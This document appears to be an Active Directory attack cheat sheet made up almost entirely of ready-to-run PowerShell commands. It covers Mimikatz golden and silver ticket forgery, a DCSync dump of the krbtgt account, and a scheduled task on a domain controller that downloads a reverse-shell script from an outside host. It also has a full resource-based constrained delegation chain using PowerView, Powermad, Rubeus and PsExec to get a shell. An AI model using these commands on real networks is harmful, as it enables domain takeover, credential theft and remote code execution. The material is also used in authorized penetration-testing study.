**Golden ticket**
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corp1.com /sid:S-I-D /krbtgt:cce9d6cd94eb31ccfbb7cc8eeadf7ce1 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

**Silver Ticket**
```Powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:sub.domain.local sid:Domain-S-I-D target:machine.sub.domain.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt"'
```

**DCSync Attack**
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt"'
```

**Scheduling RevShell Task**
```Powershell
schtasks /create /S dc.domain.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe c 'iex (New Object Net.WebClient DownloadString (''http://192.168.100.1:8080/Invoke-PowerShellTcp.ps1'')'"

schtasks /Run /S dc.domain.local /TN "STCheck"
```

**RCBD Exploitation**
```Powershell
. .\Powerview.ps1

Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}} #enumeration

Get-DomainObject -Identity prod -Properties ms-DS-MachineAccountQuota #check machine quota

. .\powermad.ps1
New-MachineAccount -MachineAccount h4xComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
Get-DomainComputer -Identity h4xComputer #create a new computer

$sid =Get-DomainComputer -Identity h4xComputer -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0) #convert SID

Get-DomainComputer -Identity appsrv01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} #set new SID

.\Rubeus.exe s4u /user:h4xcomputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt #getting the cifs ticket

.\Psexec.exe \\appsrv01.prod.corp1.com cmd.exe -accepteula # get a shell
```